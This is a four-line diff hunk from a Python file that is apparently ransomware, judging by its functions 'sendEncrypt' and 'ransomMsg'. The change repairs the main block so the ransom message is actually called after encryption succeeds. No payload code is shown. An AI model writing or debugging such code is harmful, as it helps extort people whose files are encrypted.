@@ -190,4 +190,4 @@ def ransomMsg():
 
 if __name__ == '__main__':
     if (sendEncrypt()):
-        ransomMsg
+        ransomMsg()
